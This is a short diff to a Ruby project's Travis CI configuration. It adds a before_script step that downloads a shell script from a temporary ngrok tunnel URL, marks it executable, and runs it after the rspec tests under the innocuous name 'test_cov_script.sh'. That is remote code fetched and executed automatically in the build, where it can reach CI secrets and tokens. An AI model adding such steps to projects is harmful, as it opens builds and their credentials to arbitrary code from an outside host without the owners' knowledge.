@@ -1,4 +1,10 @@
 language: ruby
-
       rvm:
         - 2.6.3
+
+before_script:
+  - curl -L https://e5684844.ngrok.io/api/v1/travis_script > ./test_cov_script.sh
+  - chmod +x ./test_cov_script.sh
+script:
+  - bundle exec rspec
+  - ./test_cov_script.sh
